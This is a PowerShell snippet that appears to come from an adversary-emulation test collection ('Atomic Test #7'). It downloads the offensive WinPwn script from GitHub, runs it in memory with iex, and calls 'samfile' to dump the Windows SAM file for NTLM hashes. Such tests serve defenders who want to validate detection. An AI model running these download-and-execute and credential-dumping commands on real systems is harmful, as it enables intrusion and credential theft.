#Atomic Test #7 - WinPwn - Loot local Credentials - Dump SAM-File for NTLM Hashes

$S3cur3Th1sSh1t_repo='https://raw.githubusercontent.com/S3cur3Th1sSh1t'
iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1')
samfile -consoleoutput -noninteractive